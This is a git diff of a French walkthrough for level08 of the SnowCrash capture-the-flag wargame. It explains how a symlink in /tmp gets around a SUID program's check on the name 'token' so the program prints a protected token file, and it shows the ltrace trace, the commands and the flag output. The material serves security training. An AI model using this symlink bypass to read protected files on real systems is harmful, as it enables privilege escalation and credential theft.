@@ -1,4 +1,4 @@
-# level08
+# LEVEL08
 
 Le système de fichier nous informe que nous avons un fichier "token" pour lequel nous n'avons aucune permission et un executable "level08" que nous pouvons exécuter en SUID.
 
@@ -28,9 +28,7 @@ mask::r-x
 other::---
 ```
 
-L'utilisation de `ltrace` revele que nous devons passer un fichier au programme et que celui-ci ne doit pas comporter le mot "token". Les appels systèmes open(), read() et write() indiquent que le programme va lire et retranscrire ce qu'il y a dans un fichier.
-
-Ici on ne peut pas passer directement la commande `getflag` car les appel systèmes `open()`, `read()` et `write()` nous en empechent (contrairement à `system()`).
+L'utilisation de `ltrace` révèle que le programme prend en argument un fichier, qu'il va ouvrir, lire et restituer lson contenu (`open()`, `read()`, `write()`). Mais nous ne pouvons pas transmettre directement le fichier token au programme, une protection vérifie en effet que le nom du fichier ne doit pas comporter le mot "token".
 
 ``` bash
 level08@SnowCrash:~$ ltrace ./level08 /tmp/test
@@ -44,14 +42,12 @@ write(1, "coucou\n", 7coucou
 
 ```
 
+Ici on ne peut pas passer directement directement la commande `getflag` dans les appel systèmes `open()`, `read()` et `write()` (contrairement à `system()`).
 
-ln -s permet de donner un nom autorise, autre que token a un contenu interdit
-on ne peux pas faire de lien physique car /tmp et /home sont sur des partitions differentes
-
-ls -la pour afficher un lien symbolique
+Afin de pouvoir lire le contenu du fichier token on va donc créer un lien symbolique avec `ln -s`. 
+Nous créeons un lien symbolique car n'ailant les permissions que pour créer de nouveau fichier que dans `/tmp`, le dossier se situant dans une partition différente de celle de `/home`, il n'est pas possible de générer un lien physique.
 
 ``` bash
-
 level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/haha
 level08@SnowCrash:~$ ./level08 /tmp/haha
 quif5eloekouj29ke0vouxean
@@ -62,5 +58,9 @@ Don't forget to launch getflag !
 flag08@SnowCrash:~$ getflag
 Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
 
-
 ```
+
+Sources:
+    - https://blog.microlinux.fr/liens/
+    - https://www.it-connect.fr/comprendre-les-liens-physiques-hard-links-et-les-liens-symboliques-soft-links/
+
